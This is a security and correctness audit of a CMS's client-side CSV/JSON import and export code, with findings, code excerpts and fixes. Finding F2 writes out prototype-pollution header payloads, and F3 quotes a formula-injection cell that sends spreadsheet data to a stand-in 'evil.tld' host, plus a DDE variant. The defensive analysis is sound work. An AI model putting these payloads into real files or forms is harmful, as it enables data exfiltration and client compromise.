# Audit 50 — admin data import / export

*Read-only audit, 2026-08-08. Scope: `packages/cms/src/data_export/**`,
`packages/cms/src/data_import/**`, and the read/write path they actually ride —
`packages/common/src/data/buildRebaseData.ts` (`wrapAsEntityData`),
`packages/client/src/{collection,transport,reviver}.ts`,
`packages/server/src/api/rest/{query-parser,api-generator}.ts`,
`packages/server-postgres/src/services/{FetchService,PersistService,row-pipeline}.ts`.
There is no server-side export or import route: both features are entirely
client-side, driven through the ordinary REST data API.*

## Verdict

The round trip does not close. Export writes CSV by default; import cannot read a
CSV **at all** — `convertFileToJson` hands every non-JSON file to
`ExcelJS.Workbook.xlsx.load`, which is a zip reader, so a `.csv` dropped into a
dialog that says *"Upload a CSV, Excel or JSON file"* fails with
`Can't find end of central directory : is this a zip file ?` (verified by running
it). This is a regression: the pre-`eef4e7b72` implementation used SheetJS
`XLSX.read`, which sniffs CSV. So the headline question — *which property types
survive a round trip* — has a shorter answer than expected: on the default path,
**none do, because the file cannot be re-read**. Through the JSON format, which
does round-trip, dates, relations, null-vs-empty-string, `map` columns without
declared sub-properties and flattened array columns are each lossy in their own
way, itemised in F7–F12 below.

Two findings are worse than fidelity. First, **the export is silently capped at
50 rows.** `ExportCollectionAction` calls `find({})` with no limit; the REST
ingress resolves an absent limit to `DEFAULT_LIST_LIMIT = 50` and clamps any
supplied limit to `MAX_LIST_LIMIT = 1000` without erroring. The dialog even shows
"This collection has a large number of documents (N)" for N > 500 immediately
before handing the user 50 rows and a `.csv` extension. Nobody is told. That is
`docs/bug-classes.md` class 23 in its purest form — a platform limit that clamps
instead of rejecting — and its blast radius is somebody treating the file as a
backup. Second, **an uploaded file's header row is a prototype-pollution
primitive**: `unflattenObject` writes `currentObj[keyPart] = …` for each
dot-segment of a column name with no guard, so a column named
`__proto__.polluted` or `constructor.prototype.x` writes onto `Object.prototype`
for the life of the tab. The identical bug in `@rebasepro/forms`' `setIn`/`getIn`
was found, fixed and written up as class 22; this sibling was missed by that
sweep.

CSV injection is unmitigated: cells are quoted and inner quotes doubled, and
nothing else. A cell beginning `=`, `+`, `-`, `@` or a tab is a live formula when
the file is opened in Excel, LibreOffice or Sheets — quoting does not prevent
this, since the spreadsheet strips the CSV quoting before evaluating the cell.

Permissions are the good news. Both directions run over the ordinary
authenticated REST API with the user's own token, so RLS binds reads and writes,
and import goes through `PostgresBackendDriver.save`, which runs
global/collection/property `beforeSave`, `afterSave` and `afterRead`. Neither
feature has a privileged path. The one real gap is that `admin.exportable` is a
declared, serialized, translated config key that **nothing reads as a gate** —
`exportable: false` still renders the Export button.

Partial failure is unhandled end to end. Import writes one row per HTTP request
in `Promise.all` batches of 25, each its own transaction; a failure at row 4,000
leaves 1–3,999 committed, reports only `error.message` with no row index and no
column, and offers a **Retry button that restarts at offset 0** — which, because
the already-written rows now conflict on their ids, can never succeed.

---

## Findings

### CRITICAL

#### F1 — Export silently returns the first 50 rows and calls it an export

`packages/cms/src/data_export/export/ExportCollectionAction.tsx:126`
`packages/server/src/api/rest/query-parser.ts:351`
`packages/types/src/controllers/data_driver.ts:57,61,84`

`doDownload` reads the collection with:

```ts
dataClient.collection(path).find({})
```

`useData()` in the admin is `wrapAsEntityData(client.data)`
(`packages/app/src/core/Rebase.tsx:182`), so this becomes a bare
`GET /api/data/<slug>` — `buildQueryString` emits no `limit` when none is passed
(`packages/client/src/transport.ts:182`). The REST parser then applies
`resolveClientListLimit(undefined)` → `DEFAULT_LIST_LIMIT` = **50**. There is no
pagination anywhere in the export path: no `iterate`, no `findAll`, no loop on
`meta.hasMore`, and `res.meta` is discarded entirely at
`ExportCollectionAction.tsx:128`.

The clamp compounds it. Even a caller who supplies `limit: 100000` is silently
reduced to `MAX_LIST_LIMIT` = 1000 — `Math.min(Math.max(1, …), maxLimit)` with no
error and no response header saying the window was narrowed. This is class 23
exactly: the limit clamps rather than rejecting, and the only party who could
notice is the one who cannot see the query.

**Failure scenario.** An operator on a 100,000-row `orders` collection opens
Export, reads the warning "This collection has a large number of documents
(100000)" (`ExportCollectionAction.tsx:197-202`, `locales/*.ts`
`large_number_of_documents`), clicks Download, and receives `orders.csv` with 50
data rows and a header. Nothing in the file, the filename, or the UI says it is a
sample. If the export was taken before a destructive migration, the other 99,950
rows are simply gone.

**Fix direction.** Page the read and show progress: the SDK client already has
`iterate()`/`findAll()` built on `collectAllPages`
(`packages/client/src/collection.ts:129-135`), but the admin's `CollectionAccessor`
does not surface either (`buildRebaseData.ts:652-705`) — add them, or drive the
loop with explicit `limit`/`offset` in the action. Whatever the mechanism, cap it
against `collectionEntitiesCount` (already a prop) and show `n / total`. If a
ceiling is kept, it must be stated in the dialog *and* the response, not applied
in silence.

#### F2 — Prototype pollution from an uploaded file's header row

`packages/cms/src/data_import/utils/transforms.ts:6-36`
reached from `packages/cms/src/data_import/utils/file_to_json.ts:68`
and `packages/cms/src/data_import/utils/data.ts:37`

```ts
} else if (i !== keyParts.length - 1) {
    currentObj[keyPart] = currentObj[keyPart] || {};
    currentObj = currentObj[keyPart];
} else {
    currentObj[keyPart] = flatObj[key];
}
```

The keys come from row 1 of the uploaded workbook (`getWorksheetHeaders`), which
is data. `res["__proto__"]` is the prototype setter, not an own property, so a
header of `__proto__.polluted` walks *out* of the object and the final assignment
lands on `Object.prototype`. Verified by executing the function verbatim under
Node:

```
Object.prototype.polluted  = pwned      // header "__proto__.polluted"
Object.prototype.polluted2 = pwned2     // header "constructor.prototype.polluted2"
```

This is `docs/bug-classes.md` class 22 — *"any `obj[key] = value` where `key` came
from outside the program"* — and the write-up names this exact case (a column
mapped out of an imported CSV). The two siblings the sweep did reach,
`@rebasepro/forms` `setIn`/`getIn` (`packages/forms/src/utils.ts:34,56`) and
`mergeDeep` (`packages/utils/src/objects.ts:208`), are guarded; this one is not,
and it is the only one whose keys are attacker-supplied by design.

**Failure scenario.** A user is sent a "product catalogue" `.xlsx` with one extra
column headed `__proto__.isAdmin`. They preview it in the import dialog and
cancel without saving. Every object in the admin tab now answers `true` to
`isAdmin`, and every `if (!obj.someFlag)` in the panel, the UI library and React
itself now takes the other branch. Nothing was written to the database, and
nothing was displayed.

**Fix direction.** Refuse, do not sanitise — the shape `setIn` settled on. Reuse
`pathTraversesPrototype` from `@rebasepro/forms` (or lift it to `@rebasepro/utils`)
and have `unflattenObject` skip such a key entirely, plus `Object.create(null)`
for the accumulator. `flattenEntry` (`data.ts:58`) and
`buildHeadersMappingFromData` (`ImportCollectionAction.tsx:420`) build keys from
the same source and want the same guard.

### HIGH

#### F3 — Exported CSV executes formulas when opened

`packages/cms/src/data_export/export/export.ts:212-222`
(same defect in the unused `downloadDataAsCsv`, `export.ts:233-248`)

```ts
const s = String(v);
return "\"" + s.replaceAll("\"", "\"\"") + "\"";
```

Quoting is CSV *escaping*; it is not formula escaping. Excel, LibreOffice Calc
and Google Sheets strip the surrounding quotes at parse time and then evaluate a
cell whose first character is `=`, `+`, `-`, `@`, `\t` or `\r`. No prefix guard
exists anywhere in the export path.

**Failure scenario.** A public signup form writes `name` =
`=HYPERLINK("https://evil.tld/?d="&A1&B1,"Click for refund")`. An admin exports
the users collection to hand to finance; finance opens it in Excel; the sheet
renders a plausible link that exfiltrates the neighbouring cells on click. The
`=cmd|'…'!A0` DDE variant is the same hole with a worse payload.

**Fix direction.** Prefix any cell whose first character is in `= + - @ \t \r`
with a single quote or a leading `'`/tab-neutralising apostrophe before quoting
— the standard OWASP mitigation — and add a test asserting it for each of the
six characters. Fix `downloadDataAsCsv` at the same time or delete it (it has no
callers).

#### F4 — CSV import is broken; the round trip cannot close

`packages/cms/src/data_import/utils/file_to_json.ts:37-79`
`packages/cms/src/data_import/components/ImportFileUpload.tsx:11`
`packages/cms/src/data_import/import/ImportCollectionAction.tsx:126`

The picker accepts `.csv` (`"text/*": [".csv", ".xls", ".xlsx"]`) and the dialog
promises "Upload a CSV, Excel or JSON file", but `convertFileToJson` branches only
on `application/json` and sends everything else to `workbook.xlsx.load(buffer)`.
ExcelJS reads xlsx as a zip archive; CSV needs `workbook.csv.read()`, which is
never called. Verified:

```
node → wb.xlsx.load(Buffer.from("id,name\n1,Alice\n"))
FAILED: Can't find end of central directory : is this a zip file ?
```

That string is what the user sees, via `snackbarController.open({ type: "error",
message: error.message })` (`ImportFileUpload.tsx:35-38`). This is a regression:
`git show eef4e7b72^:…/file_to_json.ts` used `XLSX.read(data, { type: "array",
codepage: 65001, cellDates: true })`, which auto-detects CSV. The migration to
ExcelJS dropped CSV support, the UTF-8 codepage hint and `cellDates` in one
commit, and nothing tested it — `packages/cms/test/data_import/` covers
`mapJsonParse`, `unflattenObject` and `convertDataToEntity`, never
`convertFileToJson`.

**Failure scenario.** Any user who exports (CSV is the default radio button) and
tries to re-import. Also any user importing from Postgres `COPY … TO CSV`,
Stripe, Shopify, or a spreadsheet "Save as CSV" — the overwhelmingly common
import format.

**Fix direction.** Branch on extension/MIME and call `workbook.csv.read(stream)`
(ExcelJS supports it) or re-adopt a CSV parser; either way parse with an explicit
UTF-8 decode. Add a test that feeds a real CSV buffer through
`convertFileToJson` and asserts the parsed rows — a substring assertion on the
error message would have passed the whole time.

#### F5 — Partial failure leaves an unknown state, names no row, and offers a retry that cannot work

`packages/cms/src/data_import/components/ImportSaveInProgress.tsx:30-52,98-122`

```ts
const batch = data.slice(offset, offset + batchSize);
return Promise.all(batch.map(d =>
    dataClient.collection(path).create(d.values, d.id)))
    .then(() => { … saveDataBatch(…, offset + batchSize, …) });
```

Three separate defects stack:

1. **No atomicity, no rollback.** Each `create` is its own HTTP request and its
   own Postgres transaction. `Promise.all` does not cancel its siblings, so a
   failure at row 4,000 leaves 1–3,999 committed *and* an indeterminate subset of
   its own 25-row batch committed.
2. **No diagnosis.** The error UI renders `errorSaving.message` only
   (`:65-67`). The row index, the source line, the offending column and the value
   are all available at the call site and none is reported. `processedEntities`
   is the closest thing to a position and it is not shown next to the error.
3. **A retry that cannot succeed.** `save()` calls `saveDataBatch(…, 0, 25, …)`
   unconditionally. Re-creating rows 1–3,999, which now exist, raises `23505` →
   `ApiError.conflict` (`PersistService.ts:490`). The retry therefore fails on
   its *first* batch, forever. This is class 5: remediation text — here a button
   — whose action cannot change the state that produced it.

**Failure scenario.** A 10,000-row import where row 4,000 has a null in a NOT NULL
column. The user sees "Error saving data / null value in column "sku" violates
not-null constraint", has no idea which row, clicks Retry, gets a *different*
error about a duplicate key, and is left with a table containing between 3,975
and 4,000 rows they cannot identify.

**Fix direction.** Use the bulk endpoint that already exists:
`POST /api/data/<slug>/bulk` takes `{ rows, upsert }`, validates every row *before*
the transaction opens and names the failure by row index
(`api-generator.ts:369-410`, `assertKnownWriteFields(row, …, { rowIndex })`), runs
all-or-nothing per batch, and accepts an `Idempotency-Key` so a retry is safe.
Report the failing index and message; resume from the last committed batch rather
than from zero.

#### F6 — Import cannot overwrite; the preview says it can

`packages/cms/src/data_import/import/ImportCollectionAction.tsx:403`
`packages/common/src/data/buildRebaseData.ts:666`
`packages/server/src/api/rest/api-generator.ts:621-626`
`packages/server-postgres/src/services/PersistService.ts:372-388,490`

The preview screen states, verbatim: *"Entities with the same id will be
overwritten."* It is not true. `create(values, id)` becomes
`POST /api/data/<slug>` with `id` folded into the body, which reaches
`driver.save({ values: body, status: "new" })` with no `id` argument and no
`upsert` — so `PersistService` takes the plain-insert branch
(`options?.upsert && hasFullKey` is false) and a duplicate primary key raises
`23505`, mapped to a **409 Conflict**. Combined with F5, one pre-existing id
aborts the whole import.

`upsert` support exists at every layer below (`PersistService.ts:376`,
`saveMany`, the `/bulk` route's `upsert` flag) and the import never asks for it.

**Failure scenario.** The documented workflow — export, edit in a spreadsheet,
re-import to update — fails on the first row, after the tool told the user in
writing that it would work.

**Fix direction.** Send the batch through `/bulk` with `upsert: true` when an ID
column is selected, and make the preview text conditional on that choice ("rows
with an existing id will be updated" vs. "ids must be new"). If upsert is not
wanted, change the sentence.

### MEDIUM

#### F7 — The date export toggle does nothing on real data; the test agrees with the fiction

`packages/cms/src/data_export/export/export.ts:184-185`
`packages/cms/src/data_export/export/ExportCollectionAction.tsx:219-228`
`packages/cms/test/data_export/export.test.ts:13,23`

```ts
} else if (property.type === "date" && inputValue instanceof Date) {
    value = dateExportType === "timestamp" ? inputValue.getTime() : inputValue.toISOString();
```

The admin's rows arrive over REST (`wrapAsEntityData(client.data)`), and the REST
row pipeline deliberately does *not* envelope dates — `toRestRow`'s docblock says
so: *"Dates stay as the database returned them — JSON has its own opinions about
dates that the admin's view-model does not share"*
(`packages/server-postgres/src/services/row-pipeline.ts:204-207`). Only the
driver/WebSocket path emits `{ __type: "date" }` (`data-transformer.ts:648-665`),
which is what `rebaseReviver` (`packages/client/src/reviver.ts:7-14`) revives. So
on the live path a date column is a **string** in `entity.values`,
`inputValue instanceof Date` is false, and the whole branch is dead: both radio
options produce the identical output, and "Dates as timestamps" is a declared
control that is read by nothing (class 21).

The unit test does not catch this because it builds `values.birthDate = new
Date(…)` by hand — a shape the pipeline it is testing never produces. That is
class 7 verbatim: the fixture and the code agree on a fiction.

**Fix direction.** Normalise at the boundary — parse declared `date` properties
into `Date` when building the export rows (the property type is right there) —
then the branch fires. Rewrite the test fixture to hold what the REST pipeline
actually returns.

#### F8 — Relation columns export empty

`packages/cms/src/data_export/export/export.ts:181-183`
`packages/server-postgres/src/services/row-pipeline.ts:213-240`

`processValueForExport` handles `type: "reference"` (the document-DB primitive,
guarded on `isEntityReference()`) and has **no branch for `type: "relation"`** —
the Postgres primitive, and the one every relational collection uses
(`app/config/collections/posts.ts:142,152` declares `author` and `tags` as
relations). `EntityRelation.isEntityReference()` returns `false`
(`packages/types/src/types/entities.ts:194`), so even the driver-path shape would
miss the branch.

Worse, `toRestRow` is keyed by the *row*, so with no `include` the row carries the
foreign-key column (`author_id`) and no `author` key at all — the read/write shape
mismatch already recorded in the FK-naming notes. The export's headers come from
`collection.properties`, which declares `author`, not `author_id`. Net effect on a
CSV export of `posts`: an empty `author` column, an empty `tags` column, and the
FK never emitted. The JSON export is asymmetric — `processValuesForExport` returns
`{ ...inputValues, ...updatedValues }` (`export.ts:208`), so the raw `author_id`
*does* survive there.

Import has the mirror gap: `processValueMapping` handles `to === "reference"`
(`data.ts:140`) and has no `relation` case.

**Fix direction.** Add `relation` to both mappers: export the FK value (or
`path/id`) under the declared property key, request the relation columns via
`include`, and parse the same form back on import.

#### F9 — Flattened array columns cannot be re-imported

`packages/cms/src/data_export/export/export.ts:117-120`
`packages/cms/src/data_import/utils/data.ts:25`
`packages/cms/src/util/property_utils.tsx:139-153`

With `flattenArrays` on (the default), an array property whose longest value has
more than one element is exported as `tags[0]`, `tags[1]`, … On import,
`convertDataToEntity` calls `getPropertyInPath(properties, "tags[0]")`, which only
understands dots — `"tags[0]" in properties` is false and there is no `.` — so it
returns `undefined` and the branch above it drops the column silently:

```ts
if (!mappedProperty) { return {}; }
```

`unflattenObject` *does* understand the `name[0]` form (`transforms.ts:12`), so the
two halves of the same convention disagree.

Note also that the exported CSV's *schema* depends on the data: an array with a
single element in every row exports as one `tags` column holding a JSON array,
while the same collection with one three-element row exports three columns. Two
exports of the same collection are not comparable.

**Fix direction.** Teach `getPropertyInPath` the bracket form (strip `[n]` and
resolve the array's `of`), or map the indexed headers back to the base key before
lookup.

#### F10 — Any column header containing a dot ignores the user's mapping

`packages/cms/src/data_import/utils/data.ts:23`

```ts
const mappedKey = (getIn(headersMapping, key) as string | undefined) ?? key;
```

`headersMapping` is a **flat** map whose keys are literal header strings including
dots (`buildHeadersMappingFromData` writes `headersMapping["address.street"]`,
`ImportCollectionAction.tsx:430`). `getIn` treats its second argument as a *path*
— `toPath("address.street")` → `["address","street"]` (`forms/src/utils.ts:132`)
— and walks `headersMapping.address.street`, which does not exist. It returns
`undefined`, the `?? key` fallback kicks in, and the mapping the user chose in the
mapping step is discarded. It only appears to work because the fallback usually
equals the correct answer.

**Failure scenario.** A nested `map` column headed `address.street` is remapped in
the UI to `location.road`. The preview shows the change (the preview reads
`headersMapping` directly), the import writes `address.street`.

**Fix direction.** Read the flat map directly (`headersMapping[key]`), or key it
by an escaped identifier. A test that remaps a dotted header and asserts the
resulting entity would pin it.

#### F11 — `mapJsonParse` runs `JSON.parse` on every cell

`packages/cms/src/data_import/utils/transforms.ts:38-47`

Every cell value is speculatively `JSON.parse`d and, on success, replaced. This is
how `"true"` becomes a boolean, `"null"` becomes `null`, `"1e999"` becomes
`Infinity`, and `"12345678901234567890"` loses precision — before any property
type is consulted. Leading-zero identifiers survive by luck (JSON rejects `007`),
which is not a property anyone chose.

The type coercion that *should* be doing this work already exists and is
type-aware — `processValueMapping` (`data.ts:72-175`) knows the destination
property. `mapJsonParse` runs first and destroys the evidence it needs.

**Fix direction.** Restrict the speculative parse to values that look like a JSON
object or array (`{`/`[` after trim), and let `processValueMapping` handle
scalars against the declared type.

#### F12 — An unparseable date imports as `null` behind a `catch` that cannot fire

`packages/cms/src/data_import/utils/data.ts:126-131`

```ts
} else if (from === "string" && to === "date" && typeof value === "string") {
    try { return new Date(value); } catch (e) { return value; }
```

`new Date("not a date")` does not throw; it returns an Invalid Date. The `catch`
is unreachable (class 18 — a guard that rejects nothing). The Invalid Date is then
`JSON.stringify`d on the way to the server, and `Date.prototype.toJSON` returns
`null` for a non-finite date — so a malformed date column imports as a **silent
null** with no error and no mention in the preview. `processValueMapping`'s
number branch, three cases above, already draws exactly this distinction and
explains why (`data.ts:102-111`); the date branch was not updated to match.

**Fix direction.** Check `Number.isNaN(d.getTime())` and return `null` explicitly —
better, surface it, since the neighbouring number branch's comment argues that
"saying so lets the importer's own validation see them" and no such validation
currently runs.

#### F13 — A blank header cell shifts every later column's data

`packages/cms/src/data_import/utils/file_headers.ts:10-13`
`packages/cms/src/data_import/utils/file_to_json.ts:55-64`

```ts
headerRow.eachCell({ includeEmpty: false }, (cell, colNumber) => {
    headers[colNumber - 1] = cell.text ?? `Column${colNumber}`;
});
return headers.filter(Boolean);
```

`includeEmpty: false` leaves a hole at the blank column's index; `filter(Boolean)`
then **compacts** the array, so the positional contract with the data loop —
`const header = headers[colNumber - 1]` — is broken for every column to the right
of the gap. With headers in A and C and a blank B: column B's data is written
under header `C`, and column C's data is dropped (`headers[2]` is `undefined`).

**Failure scenario.** A spreadsheet with a spacer column, or one where the header
of an optional column was cleared. The import succeeds, the preview looks
plausible, and one column's values are stored under a neighbouring column's name.

**Fix direction.** Iterate `1..worksheet.columnCount` positionally rather than
`eachCell`, keep placeholders for blanks, and do not compact.

#### F14 — `admin.exportable` is declared and never enforced

`packages/cms-types/src/admin_collection.ts:414`
`packages/cms/src/components/CollectionViewBinding/CollectionViewActions.tsx:186-193`
`packages/cms/src/data_export/export/ExportCollectionAction.tsx:50`

`exportable?: boolean | ExportConfig<USER>` is a public option, listed in the admin
block allowlist (`packages/types/src/types/admin_block.ts:48`), round-tripped by
the collection editor (`serializable_utils.ts:541`), and compared in the memo
guard (`CollectionViewBinding.tsx:1256`). The only code that reads it is
`typeof collection.exportable === "object" ? … : undefined`, which extracts the
`additionalFields`. **The boolean is never consulted.** `ImportCollectionAction`
and `ExportCollectionAction` are rendered unconditionally for every collection;
setting `exportable: false` changes nothing. Class 21: a declared extension point
that nothing reads, and a user writing correct code against it gets silence.

There is no `importable` counterpart at all, so there is no way to disable import
either.

**Fix direction.** Gate both actions in `CollectionViewActions` on
`collection.exportable !== false` (and add the import equivalent), or name it in
the dead-option list and warn, per the pattern the class-21 write-up recommends.

#### F15 — Export ignores the table's active filter, search and sort

`packages/cms/src/data_export/export/ExportCollectionAction.tsx:126`

`find({})` carries no `where`, `searchString` or `orderBy`, and `tableController`
— which holds all three — is available in `actionProps`
(`CollectionViewActions.tsx:157`) and unused by the export. A user who filters to
"orders in the last 30 days" and clicks Export gets the first 50 rows of the
unfiltered collection in the default order.

**Fix direction.** Forward the controller's query, and label the dialog with what
is about to be exported ("50 of 12,431 matching rows").

#### F16 — Cancelling during the save does not cancel the import

`packages/cms/src/data_import/import/ImportCollectionAction.tsx:206-209`
`packages/cms/src/data_import/components/ImportSaveInProgress.tsx:37-52`

The Cancel button is rendered in `DialogActions` for every step, including
`import_data_saving`. Clicking it calls `handleClose`, unmounting
`ImportSaveInProgress` — but `saveDataBatch` is a self-recursive promise chain
holding `dataClient` and the full row array. It keeps issuing writes after the
dialog is gone, with no visible progress. The on-screen caption meanwhile says
"Do not close this tab or the import will be interrupted", which is the opposite
of the guarantee the user gets from Cancel.

**Fix direction.** Hide Cancel during the save, or thread an `AbortController` /
cancellation flag checked between batches, and say what a cancel leaves behind
(partially imported).

#### F17 — The WebSocket one-shot fetch applies no list-limit bound

`packages/server-postgres/src/websocket.ts:311-315`
vs. `packages/server-postgres/src/services/realtimeService.ts:441-449`
and `packages/server/src/api/rest/query-parser.ts:346-355`

`FETCH_COLLECTION` forwards the client payload straight to
`delegate.fetchCollection(request)`. `FetchService.buildDrizzleQueryOptions`
applies a limit only if one is present (`FetchService.ts:500-501`), so an absent
or enormous `limit` on this frame is an unbounded read of the table. The REST
ingress and the *subscription* path both route through `resolveClientListLimit` —
and the subscription's comment states the shared guarantee explicitly — but this
third call site was missed. That is class 17 along its second axis: the feature
was applied at most of its call sites.

The admin does not currently reach this ingress for reads (it is on REST), so this
is not the cause of F1; it is the hole that a naive "just raise the limit" fix
would be tempted to exploit.

**Fix direction.** Wrap the payload's `limit` in `resolveClientListLimit` before
handing it to the driver, exactly as `realtimeService` does.

#### F18 — `usePostgresClientDriver.fetchCollection` drops `offset` and `logical`

`packages/client-postgres/src/usePostgresClientDriver.ts:45-55`

```ts
const { path, filter, limit, startAfter, orderBy, searchString, order } = props;
```

`FetchCollectionProps` declares `offset` and `logical`
(`packages/types/src/controllers/data_driver.ts:114-116`) and
`buildRebaseData.ts:200-209` passes both. They are dropped here. Forty lines
below, `listenCollection` was converted to whole-object forwarding with a comment
naming this precise bug — *"Re-listing the fields by hand is what dropped `offset`
and `logical` on this hop"* (`:91-94`) — and its sibling three functions above was
left as-is. A dropped `offset` serves page one to a caller asking for page three;
a dropped `logical` widens an `or(...)` query to everything policy allows.

This matters to this unit because it is the hop any offset-paginated export would
have to survive if a driver-backed data source is registered. Also flagged in
audit 42 (F1); recorded here because it is on the fix path for F1.

**Fix direction.** `const { ...query } = props;` and forward it whole, as the
sibling does.

### LOW

- **`downloadBlob` never revokes its object URL** (`export.ts:224-231`). The blob
  is retained for the life of the document. Harmless at 50 rows, not at 100k.
- **No UTF-8 BOM on the exported CSV** (`export.ts:47`). Excel on Windows decodes
  it as the system codepage, so accented characters and CJK are mangled. The old
  import path passed `codepage: 65001` for exactly this reason; the export never
  had the counterpart.
- **JSON export dumps every row column**, including ones the collection does not
  declare — `processValuesForExport` returns `{ ...inputValues, ...updatedValues }`
  (`export.ts:208`) and `getEntityJsonExportableData` returns it unfiltered
  (`:97`). The CSV export does not, because headers are derived from
  `properties`. Not an escalation (the same row is on the wire either way, and
  `excludeFromApi` columns are stripped server-side at
  `row-pipeline.ts:104-117`), but it is a difference between what the table view
  shows and what the file contains.
- **Number default values are strings.** `DefaultValuesField`'s number branch
  passes `event.target.value` straight through
  (`DataNewPropertiesMapping.tsx:213-218`), so `defaultValues.price` is `"10"` and
  is merged into the row unconverted.
- **The date default-value field is unreachable.** `DefaultValuesField` implements
  a `date` branch (`:231-240`) that the caller's type filter —
  `["number","string","boolean","map"]` (`:130`) — never admits. `map` is admitted
  and returns `null`. Class 20/21 in miniature.
- **Dead code.** `isUnixTimestamp` (`get_import_inference_type.ts:24`) has no
  caller; `downloadDataAsCsv` (`export.ts:233`) has no caller but is publicly
  exported from `packages/cms/src/data_export/index.ts`;
  `get_properties_mapping.ts` is 68 lines of commented-out source;
  `ExportCollectionAction.tsx:5-9` imports `useAuthController` and
  `useCustomizationController` and uses neither.
- **`fetchAdditionalFields` has unbounded concurrency**
  (`ExportCollectionAction.tsx:87,101`): `Promise.all` over every entity × every
  additional field, each of which may do I/O. Bounded today only by F1's 50-row
  cap — it becomes a thundering herd the moment F1 is fixed.
- **`getDefaultValuesFor` is recomputed per row** inside the map at
  `ExportCollectionAction.tsx:138`.
- **Boolean import accepts only the literal `"true"`** (`data.ts:114-115`), so
  `TRUE`, `True`, `1`, `yes` all import as `false` rather than as an error.

---

## Checked and clean

- **Permissions / RLS on export.** The read is a plain
  `GET /api/data/<slug>` on the signed-in user's token. There is no service-key
  path, no admin driver, and no server-side export route anywhere in
  `packages/server` or `packages/server-postgres`. RLS binds it exactly as it
  binds the table view.
- **`excludeFromApi` columns.** Stripped server-side in `stripExcluded`
  (`row-pipeline.ts:104-117`), on relation targets too, so password hashes and
  verification tokens cannot reach an export by either format.
- **Import does not bypass callbacks.** `create` →
  `POST /api/data/<slug>` → `PostgresBackendDriver.save`, which runs global,
  collection and property `beforeSave` (`PostgresBackendDriver.ts:598-640`),
  `afterRead` and `afterSave`, plus `updateDateAutoValues`. Unknown write fields
  are rejected by `assertKnownWriteFields` (`api-generator.ts:546`).
- **`getIn` / `setIn` / `mergeDeep`** — all three reached by the import path — are
  guarded against prototype traversal (`forms/src/utils.ts:34,56`,
  `utils/src/objects.ts:208`). Only `unflattenObject` is not (F2).
- **`getValueInPath`** handles the `key[0]` bracket form correctly
  (`utils/src/objects.ts:289-303`), so the export side of the flattened-array
  convention works; only the import side (F9) does not.
- **CSV quoting itself** is correct for the delimiter/quote/newline cases: every
  cell is quoted and inner `"` doubled (`export.ts:212-222`), so commas,
  embedded quotes and CRLF inside a value round-trip through any conformant CSV
  reader. The gap is formula escaping (F3), not escaping.
- **`map` properties with declared sub-properties** flatten to `parent.child`
  headers on export (`export.ts:143-155`) and are reassembled by
  `unflattenObject` on import. This is the one composite type whose round trip is
  structurally sound.
- **The idempotency claim/release path** (`api-generator.ts:599-617`) is correct
  and available to the import; it simply is not used (F5).

---

## Open questions

1. **Was the 50-row export ever intentional?** `DOCS_LIMIT = 500` exists purely
   to show a warning, which suggests the author believed the export was
   unbounded. Nothing in the repo documents a deliberate export ceiling. If one
   is wanted, it needs a number, a message and a place to configure it.
2. **What is the intended composite-key behaviour on import?** `convertDataToEntity`
   produces a single `id` string (`data.ts:38-49`) and
   `buildCompositeId`/`parseIdValues` use `COMPOSITE_ID_SEPARATOR`. Whether an
   exported composite id re-imports is UNCONFIRMED — I did not find a test either
   way, and reading alone cannot settle whether the separator survives a
   spreadsheet.
3. **Do `vector` and `geopoint` properties have any intended export form?**
   `processValueForExport` has no branch for either. A `Vector` would reach
   `String(v)`; import has a `vector` branch (`data.ts:81-98`) with no export
   counterpart, so the asymmetry looks unintentional.
4. **Should the export honour `admin.hideFromCollection` / column visibility?**
   Today the header set is `propertiesOrder ?? Object.keys(properties)`, so a
   property hidden from the table is still exported. Arguably correct for an
   export; it should be a decision rather than an accident.
5. **Is there an appetite for a server-side export?** Every scale problem here
   (F1, the in-memory string concat in `getEntityCSVExportableData`, the blob) is
   a consequence of doing the work in the browser. A streaming
   `GET /api/data/<slug>/export` that respects RLS would remove F1, F15 and the
   memory concerns at once, and would be the natural home for the F3 escaping.
